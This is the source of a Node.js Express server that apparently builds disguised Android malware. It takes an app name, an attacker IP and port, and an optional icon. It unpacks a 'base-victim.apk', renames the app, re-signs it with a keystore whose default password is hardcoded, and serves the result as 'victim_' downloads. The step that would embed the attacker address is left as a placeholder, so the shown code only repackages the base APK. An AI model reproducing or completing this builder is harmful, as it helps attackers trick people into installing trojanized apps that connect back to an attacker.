const express = require("express");
const fs = require("fs");
const path = require("path");
const AdmZip = require("adm-zip");
const { exec } = require("child_process");
const multer = require("multer");

const app = express();
app.use(express.json({ limit: '50mb' }));

const BASE_APK_PATH = path.join(__dirname, "base-victim.apk");
const OUTPUT_DIR = path.join(__dirname, "output_apks");
const UPLOADS_DIR = path.join(__dirname, "uploads");
const KEYSTORE_PATH = path.join(__dirname, "keystore.jks");

// Keystore config (change these if you set your own password/key)
const KEYSTORE_PASSWORD = process.env.KEYSTORE_PASSWORD || "password123";
const KEY_ALIAS = process.env.KEY_ALIAS || "mykey";
const KEY_PASSWORD = process.env.KEY_PASSWORD || "password123";

if (!fs.existsSync(OUTPUT_DIR)) fs.mkdirSync(OUTPUT_DIR, { recursive: true });
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

// Simple health check endpoint
app.get("/", (req, res) => {
    res.json({ status: "APK Builder Live", baseApk: fs.existsSync(BASE_APK_PATH) });
});

// Main build endpoint
app.post("/build-apk", multer().single("iconFile"), async (req, res) => {
    try {
        const { appName, attackerIp, attackerPort, backendUrl, packageName } = req.body;
        if (!appName || !attackerIp || !attackerPort)
            return res.status(400).json({ error: "Missing fields" });

        const buildId = Date.now() + "_" + Math.floor(Math.random() * 10000);
        const tempDir = path.join(OUTPUT_DIR, `temp_${buildId}`);
        const unsignedApk = path.join(OUTPUT_DIR, `unsigned_${buildId}.apk`);
        const signedApk = path.join(OUTPUT_DIR, `victim_${buildId}.apk`);

        // Extract base APK
        const zip = new AdmZip(BASE_APK_PATH);
        zip.extractAllTo(tempDir, true);

        // Example: Modify string resources (add code to fully customize if needed)
        const stringsPath = path.join(tempDir, "res", "values", "strings.xml");
        if (fs.existsSync(stringsPath)) {
            let content = fs.readFileSync(stringsPath, "utf8");
            content = content.replace(/<string name="app_name">[^<]*<\/string>/, `<string name="app_name">${appName}</string>`);
            fs.writeFileSync(stringsPath, content, "utf8");
        }

        // [ ... Add more modification logic as needed ... ]
        
        // Repack APK (zip)
        const newZip = new AdmZip();
        (function addFolderToZip(zipper, folder, basePath) {
            fs.readdirSync(folder).forEach(item => {
                const fp = path.join(folder, item);
                const rel = basePath ? `${basePath}/${item}` : item;
                if (fs.lstatSync(fp).isDirectory()) addFolderToZip(zipper, fp, rel);
                else zipper.addLocalFile(fp, basePath || undefined);
            });
        })(newZip, tempDir, "");
        newZip.writeZip(unsignedApk);

        // SIGN APK IF KEYSTORE EXISTS
        let finalApk = unsignedApk;
        if (fs.existsSync(KEYSTORE_PATH)) {
            await signApk(unsignedApk, signedApk);
            finalApk = signedApk;
        }

        fs.rmSync(tempDir, { recursive: true, force: true });

        res.json({
            success: true,
            downloadUrl: `/download/${buildId}`,
            signed: fs.existsSync(KEYSTORE_PATH),
            message: "APK built and ready"
        });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: e.message });
    }
});

// Download endpoint
app.get("/download/:buildId", (req, res) => {
    const buildId = req.params.buildId;
    const signedPath = path.join(OUTPUT_DIR, `victim_${buildId}.apk`);
    const unsignedPath = path.join(OUTPUT_DIR, `unsigned_${buildId}.apk`);
    const apkPath = fs.existsSync(signedPath) ? signedPath : unsignedPath;
    if (!fs.existsSync(apkPath)) return res.status(404).json({ error: "APK not found" });
    res.download(apkPath, err => { if (!err) setTimeout(() => fs.unlinkSync(apkPath), 5 * 60 * 1000); });
});

// APK Signing helper
function signApk(input, output) {
    return new Promise((resolve, reject) => {
        const command = `jarsigner -verbose -keystore "${KEYSTORE_PATH}" -storepass "${KEYSTORE_PASSWORD}" -keypass "${KEY_PASSWORD}" -signedjar "${output}" "${input}" "${KEY_ALIAS}"`;
        exec(command, (err, stdout, stderr) => {
            if (err) reject(new Error(stderr));
            else resolve(stdout);
        });
    });
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`APK builder running at http://localhost:${PORT}/`);
});
